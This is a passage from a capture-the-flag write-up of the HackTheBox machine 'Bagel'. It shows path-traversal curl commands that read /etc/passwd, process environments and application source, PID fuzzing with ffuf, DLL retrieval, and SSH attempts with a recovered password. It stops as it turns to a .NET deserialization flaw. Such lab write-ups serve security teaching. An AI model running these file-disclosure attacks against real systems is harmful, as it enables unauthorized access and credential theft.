+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20263\r\nLocation:\x20http://bagel\.htb:8000/\?page=index\.html\r\nCon
+</span></span></span><span class=line><span class=cl><span class=s2>SF:nection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=en&gt;\n&lt;title&gt;
+</span></span></span><span class=line><span class=cl><span class=s2>SF:Redirecting\.\.\.&lt;/title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;/h1&gt;\n&lt;p&gt;You\x20should
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0&lt;a\x20href=\&#34;http://bagel\.htb:8000/\?page=index\.html\&#34;&gt;http://bagel\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:.htb:8000/\?page=index\.html&lt;/a&gt;\.\x20If\x20not,\x20click\x20the\x20lin
+</span></span></span><span class=line><span class=cl><span class=s2>SF:k\.\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>FourOhFourRequest,184,<span class=s2>&#34;HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nSe
+</span></span></span><span class=line><span class=cl><span class=s2>SF:rver:\x20Werkzeug/2\.2\.2\x20Python/3\.10\.9\r\nDate:\x20Fri,\x2007\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:Apr\x202023\x2008:46:08\x20GMT\r\nContent-Type:\x20text/html;\x20charse
+</span></span></span><span class=line><span class=cl><span class=s2>SF:t=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n&lt;!doct
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ype\x20html&gt;\n&lt;html\x20lang=en&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h
+</span></span></span><span class=line><span class=cl><span class=s2>SF:1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manua
+</span></span></span><span class=line><span class=cl><span class=s2>SF:lly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>Socks5,213,<span class=s2>&#34;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\&#34;http://www\.w3\.org/
+</span></span></span><span class=line><span class=cl><span class=s2>SF:TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;tex
+</span></span></span><span class=line><span class=cl><span class=s2>SF:t/html;charset=utf-8\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x20\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#39;\\x05\\x04\\x00
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\\x01\\x02\\x80\\x05\\x01\\x00\\x03&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 137.12 seconds
+</span></span></code></pre></td></tr></table></div></div><p>Apart from SSH running, we see something on port 5000, and a HTTP server that appears to be werkzeug on port 8000 which redirects to <a href="http://bagel.htb:8000/?page=index.html" target=_blank rel="noopener noreffer">http://bagel.htb:8000/?page=index.html</a> . Adding <code>110.10.11.201 bagel.htb</code> to our <code>/etc/hosts</code>and browsing here, we get a fairly nice and delicious landing page:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-07-18-52-57-image.png data-srcset="./assets/2023-04-07-18-52-57-image.png, ./assets/2023-04-07-18-52-57-image.png 1.5x, ./assets/2023-04-07-18-52-57-image.png 2x" data-sizes=auto alt=./assets/2023-04-07-18-52-57-image.png title=./assets/2023-04-07-18-52-57-image.png></p><p>Following the link to the orders page, where I don&rsquo;t see an order under my name &ndash; and that makes me sad:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-07-18-54-06-image.png data-srcset="./assets/2023-04-07-18-54-06-image.png, ./assets/2023-04-07-18-54-06-image.png 1.5x, ./assets/2023-04-07-18-54-06-image.png 2x" data-sizes=auto alt=./assets/2023-04-07-18-54-06-image.png title=./assets/2023-04-07-18-54-06-image.png></p><h2 id=foothold>Foothold</h2><p>I ran feroxbuster in the background, then started trying Local File Inclusion with path traversal (note the <code>page=index.html</code> query param on our home page). And, this straight forward path traversal works:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://bagel.htb:8000/?page=../../../../../etc/passwd&#34;</span> 
+</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>bin❌1:1:bin:/bin:/sbin/nologin
+</span></span><span class=line><span class=cl>daemon❌2:2:daemon:/sbin:/sbin/nologin
+</span></span><span class=line><span class=cl>adm❌3:4:adm:/var/adm:/sbin/nologin
+</span></span><span class=line><span class=cl>lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
+</span></span><span class=line><span class=cl>sync❌5:0:sync:/sbin:/bin/sync
+</span></span><span class=line><span class=cl>shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
+</span></span><span class=line><span class=cl>halt❌7:0:halt:/sbin:/sbin/halt
+</span></span><span class=line><span class=cl>mail❌8:12:mail:/var/spool/mail:/sbin/nologin
+</span></span><span class=line><span class=cl>operator❌11:0:operator:/root:/sbin/nologin
+</span></span><span class=line><span class=cl>games❌12💯games:/usr/games:/sbin/nologin
+</span></span><span class=line><span class=cl>ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
+</span></span><span class=line><span class=cl>nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
+</span></span><span class=line><span class=cl>dbus❌81:81:System message bus:/:/sbin/nologin
+</span></span><span class=line><span class=cl>tss❌59:59:Account used <span class=k>for</span> TPM access:/dev/null:/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-network❌192:192:systemd Network Management:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-oom❌999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-resolve❌193:193:systemd Resolver:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>polkitd❌998:997:User <span class=k>for</span> polkitd:/:/sbin/nologin
+</span></span><span class=line><span class=cl>rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+</span></span><span class=line><span class=cl>abrt❌173:173::/etc/abrt:/sbin/nologin
+</span></span><span class=line><span class=cl>setroubleshoot❌997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
+</span></span><span class=line><span class=cl>cockpit-ws❌996:994:User <span class=k>for</span> cockpit web service:/nonexisting:/sbin/nologin
+</span></span><span class=line><span class=cl>cockpit-wsinstance❌995:993:User <span class=k>for</span> cockpit-ws instances:/nonexisting:/sbin/nologin
+</span></span><span class=line><span class=cl>rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+</span></span><span class=line><span class=cl>sshd❌74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
+</span></span><span class=line><span class=cl>chrony❌994:992::/var/lib/chrony:/sbin/nologin
+</span></span><span class=line><span class=cl>dnsmasq❌993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
+</span></span><span class=line><span class=cl>tcpdump❌72:72::/:/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-coredump❌989:989:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-timesync❌988:988:systemd Time Synchronization:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>developer❌1000:1000::/home/developer:/bin/bash
+</span></span><span class=line><span class=cl>phil❌1001:1001::/home/phil:/bin/bash
+</span></span><span class=line><span class=cl>_laurel❌987:987::/var/log/laurel:/bin/false
+</span></span></code></pre></td></tr></table></div></div><p>Apart from <code>root</code>, the <code>developer</code> and <code>phil</code> (user id >= 1000) look interesting. I tried reading <code>../../../../home/developer/.ssh/id_rsa</code> and <code>../../../../home/phil/.ssh/id_rsa</code>, hoping to get a private SSH key, but just got <code>File not found</code>.</p><p>We can use procfs via LFI to enumerate further. We try reading the environment by using <code>/proc/self/environ</code>, along with <code>/proc/self/cmdline</code>, to see the current process and arguments:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://bagel.htb:8000/?page=../../../../../proc/self/environ&#34;</span> --output -
+</span></span><span class=line><span class=cl><span class=nv>LANG</span><span class=o>=</span>en_US.UTF-8PATH<span class=o>=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binHOME<span class=o>=</span>/home/developerLOGNAME<span class=o>=</span><span class=nv>developerUSER</span><span class=o>=</span><span class=nv>developerSHELL</span><span class=o>=</span>/bin/bashINVOCATION_ID<span class=o>=</span><span class=nv>f9c0f362492c4ff9a36ee87a5a311a25JOURNAL_STREAM</span><span class=o>=</span>8:25486SYSTEMD_EXEC_PID<span class=o>=</span>897% 
+</span></span><span class=line><span class=cl>curl <span class=s2>&#34;http://bagel.htb:8000/?page=../../../../../proc/self/cmdline&#34;</span> --output - 
+</span></span><span class=line><span class=cl>python3/home/developer/app/app.py%          
+</span></span></code></pre></td></tr></table></div></div><p>So the target is running a flask app with <code>python3 /home/developer/app/app.py</code>. Let&rsquo;s take a look now we&rsquo;ve identified the app entry point:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://bagel.htb:8000/?page=../../../../../home/developer/app/app.py&#34;</span> --output -
+</span></span><span class=line><span class=cl>from flask import Flask, request, send_file, redirect, Response
+</span></span><span class=line><span class=cl>import os.path
+</span></span><span class=line><span class=cl>import websocket,json
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>app</span> <span class=o>=</span> Flask<span class=o>(</span>__name__<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@app.route<span class=o>(</span><span class=s1>&#39;/&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>def index<span class=o>()</span>:
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;page&#39;</span> in request.args:
+</span></span><span class=line><span class=cl>            <span class=nv>page</span> <span class=o>=</span> <span class=s1>&#39;static/&#39;</span>+request.args.get<span class=o>(</span><span class=s1>&#39;page&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> os.path.isfile<span class=o>(</span>page<span class=o>)</span>:
+</span></span><span class=line><span class=cl>                <span class=nv>resp</span><span class=o>=</span>send_file<span class=o>(</span>page<span class=o>)</span>
+</span></span><span class=line><span class=cl>                resp.direct_passthrough <span class=o>=</span> False
+</span></span><span class=line><span class=cl>                <span class=k>if</span> os.path.getsize<span class=o>(</span>page<span class=o>)</span> <span class=o>==</span> 0:
+</span></span><span class=line><span class=cl>                    resp.headers<span class=o>[</span><span class=s2>&#34;Content-Length&#34;</span><span class=o>]=</span>str<span class=o>(</span>len<span class=o>(</span>resp.get_data<span class=o>()))</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> resp
+</span></span><span class=line><span class=cl>            <span class=k>else</span>:
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=s2>&#34;File not found&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span>:
+</span></span><span class=line><span class=cl>                <span class=k>return</span> redirect<span class=o>(</span><span class=s1>&#39;http://bagel.htb:8000/?page=index.html&#39;</span>, <span class=nv>code</span><span class=o>=</span>302<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>@app.route<span class=o>(</span><span class=s1>&#39;/orders&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>def order<span class=o>()</span>: <span class=c1># don&#39;t forget to run the order app first with &#34;dotnet &lt;path to .dll&gt;&#34; command. Use your ssh key to access the machine.</span>
+</span></span><span class=line><span class=cl>    try:
+</span></span><span class=line><span class=cl>        <span class=nv>ws</span> <span class=o>=</span> websocket.WebSocket<span class=o>()</span>    
+</span></span><span class=line><span class=cl>        ws.connect<span class=o>(</span><span class=s2>&#34;ws://127.0.0.1:5000/&#34;</span><span class=o>)</span> <span class=c1># connect to order app</span>
+</span></span><span class=line><span class=cl>        <span class=nv>order</span> <span class=o>=</span> <span class=o>{</span><span class=s2>&#34;ReadOrder&#34;</span>:<span class=s2>&#34;orders.txt&#34;</span><span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=nv>data</span> <span class=o>=</span> str<span class=o>(</span>json.dumps<span class=o>(</span>order<span class=o>))</span>
+</span></span><span class=line><span class=cl>        ws.send<span class=o>(</span>data<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=nv>result</span> <span class=o>=</span> ws.recv<span class=o>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=o>(</span>json.loads<span class=o>(</span>result<span class=o>)[</span><span class=s1>&#39;ReadOrder&#39;</span><span class=o>])</span>
+</span></span><span class=line><span class=cl>    except:
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=o>(</span><span class=s2>&#34;Unable to connect&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span>:
+</span></span><span class=line><span class=cl>  app.run<span class=o>(</span><span class=nv>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span>, <span class=nv>port</span><span class=o>=</span>8000<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>This stood out:</p><p><code># don't forget to run the order app first with "dotnet &lt;path to .dll>" command. Use your ssh key to access the machine.</code></p><p>But I wasn&rsquo;t able to read a private key for the <code>developer</code> user:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://bagel.htb:8000/?page=../../../../../home/developer/.ssh/id_rsa&#34;</span> --output - 
+</span></span><span class=line><span class=cl>File not found%       
+</span></span></code></pre></td></tr></table></div></div><p>Our <code>/orders</code> endpoint connects to <code>localhost:5000</code> as a websocket, sending a JSON payload <code>{"ReadOrder": "orders.txt"}</code>, hence the text that displays. Let&rsquo;s try sending the same payload to the websocket, which is exposed to us on port 5000 using <code>wsdump</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$wsdump</span> ws://bagel.htb:5000 
+</span></span><span class=line><span class=cl>Press Ctrl+C to quit
+</span></span><span class=line><span class=cl>&gt; <span class=o>{</span><span class=s2>&#34;ReadOrder&#34;</span>:<span class=s2>&#34;orders.txt&#34;</span><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt; <span class=o>{</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;UserId&#34;</span>: 0,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Session&#34;</span>: <span class=s2>&#34;Unauthorized&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Time&#34;</span>: <span class=s2>&#34;12:28:42&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;RemoveOrder&#34;</span>: null,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;WriteOrder&#34;</span>: null,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;ReadOrder&#34;</span>: <span class=s2>&#34;order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]\norder #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]\norder #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] \n&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Can we write orders?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; <span class=o>{</span><span class=s2>&#34;WriteOrder&#34;</span>: <span class=s2>&#34;Em - infinity+1 bagels plz&#34;</span><span class=o>}</span>
+</span></span><span class=line><span class=cl>&lt; <span class=o>{</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;UserId&#34;</span>: 0,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Session&#34;</span>: <span class=s2>&#34;Unauthorized&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Time&#34;</span>: <span class=s2>&#34;12:44:27&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;RemoveOrder&#34;</span>: null,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;WriteOrder&#34;</span>: <span class=s2>&#34;Operation successed&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;ReadOrder&#34;</span>: null
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Yep:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-07-19-44-56-image.png data-srcset="./assets/2023-04-07-19-44-56-image.png, ./assets/2023-04-07-19-44-56-image.png 1.5x, ./assets/2023-04-07-19-44-56-image.png 2x" data-sizes=auto alt=./assets/2023-04-07-19-44-56-image.png title=./assets/2023-04-07-19-44-56-image.png></p><p>Obviously the orders app is running as a separate process on port 5000. Can we find it? Once again, we can use procfs &ndash; specifically <code>/proc/PID/cmdline</code> &ndash; to find the process and arguments as we did above for <code>self</code> &ndash; let&rsquo;s pass in a sequence of PIDs, and output the results from <code>ffuf</code> to the <code>out</code> directory , filtering out 0 byte (empty) and 14 byte (<code>File not found</code>) responses:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$seq</span> <span class=m>1</span> <span class=m>1000</span> <span class=p>|</span> ffuf -w - -u <span class=s2>&#34;http://bagel.htb:8000/?page=../../../../../proc/FUZZ/cmdline&#34;</span> -od out -fs 0,14
+</span></span></code></pre></td></tr></table></div></div><p>Running a <code>tail -n +1 out/*</code> and sifting through the results, the following stands out (remember the comment we found earlier hinting at running a DLL via <code>dotnet</code>):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>==&gt; out/0a7b93ebd4dc507bede6ef31821461da &lt;==
+</span></span><span class=line><span class=cl>GET /?page=../../../../../proc/931/cmdline HTTP/1.1
+</span></span><span class=line><span class=cl>Host: bagel.htb:8000
+</span></span><span class=line><span class=cl>User-Agent: Fuzz Faster U Fool v1.4.1-dev
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>---- ↑ Request ---- Response ↓ ----
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Content-Length: 45
+</span></span><span class=line><span class=cl>Cache-Control: no-cache
+</span></span><span class=line><span class=cl>Content-Disposition: inline; filename=cmdline
+</span></span><span class=line><span class=cl>Content-Type: application/octet-stream
+</span></span><span class=line><span class=cl>Date: Fri, 07 Apr 2023 10:22:33 GMT
+</span></span><span class=line><span class=cl>Date: Fri, 07 Apr 2023 10:22:33 GMT
+</span></span><span class=line><span class=cl>Etag: &#34;1680862003.0064297-0-927076966&#34;
+</span></span><span class=line><span class=cl>Last-Modified: Fri, 07 Apr 2023 10:06:43 GMT
+</span></span><span class=line><span class=cl>Server: Werkzeug/2.2.2 Python/3.10.9
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s take a copy of our .NET based DLL:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://bagel.htb:8000/?page=../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll&#34;</span> --output - &gt; bagel.dll
+</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span class=line><span class=cl><span class=m>100</span> <span class=m>10752</span>  <span class=m>100</span> <span class=m>10752</span>    <span class=m>0</span>     <span class=m>0</span>  <span class=m>22322</span>      <span class=m>0</span> --:--:-- --:--:-- --:--:-- <span class=m>22307</span>
+</span></span><span class=line><span class=cl><span class=nv>$file</span> bagel.dll
+</span></span><span class=line><span class=cl>bagel.dll: PE32 executable <span class=o>(</span>console<span class=o>)</span> Intel <span class=m>80386</span> Mono/.Net assembly, <span class=k>for</span> MS Windows
+</span></span></code></pre></td></tr></table></div></div><p>I found a cross-platform compiled version of ILSpy here: <a href=https://github.com/icsharpcode/AvaloniaILSpy target=_blank rel="noopener noreffer">AvaloniaILSpy</a>, allowing me to decompile bagel.dll on Linux. Digging through the assembly, classes, and their methods, a few things stood out. Database credentials:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-07-21-32-30-image.png data-srcset="./assets/2023-04-07-21-32-30-image.png, ./assets/2023-04-07-21-32-30-image.png 1.5x, ./assets/2023-04-07-21-32-30-image.png 2x" data-sizes=auto alt=./assets/2023-04-07-21-32-30-image.png title=./assets/2023-04-07-21-32-30-image.png></p><p>Maybe this password is reused? Unfortunately it didn&rsquo;t work when attempting to SSH as <code>developer</code> or <code>phil</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$sshpass</span> -p k8wdAYYKyhnjg3K ssh phil@bagel.htb
+</span></span><span class=line><span class=cl>phil@bagel.htb: Permission denied <span class=o>(</span>publickey,gssapi-keyex,gssapi-with-mic<span class=o>)</span>.
+</span></span><span class=line><span class=cl><span class=nv>$sshpass</span> -p k8wdAYYKyhnjg3K ssh developer@bagel.htb
+</span></span><span class=line><span class=cl>developer@bagel.htb: Permission denied <span class=o>(</span>publickey,gssapi-keyex,gssapi-with-mic<span class=o>)</span>.
+</span></span></code></pre></td></tr></table></div></div><p>This deserialisation also caught my attention in the <code>Handler</code> class:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-09-15-03-29-image.png data-srcset="./assets/2023-04-09-15-03-29-image.png, ./assets/2023-04-09-15-03-29-image.png 1.5x, ./assets/2023-04-09-15-03-29-image.png 2x" data-sizes=auto alt=./assets/2023-04-09-15-03-29-image.png title=./assets/2023-04-09-15-03-29-image.png></p><p>This Microsoft page <a href=https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca2326 target=_blank rel="noopener noreffer">CA2326: Do not use TypeNameHandling values other than None (code analysis) - .NET | Microsoft Learn</a> is explicit in not allowing TypeNameHandling, which is a non-zero value &ndash; our bagel.dll assembly above sets this to 4, which is <em>Auto</em>.</p><p>In theory, this should allow us to inject into our payload in such a way that we can deserialize into any .NET type we specify.</p><p>Bagel has its own 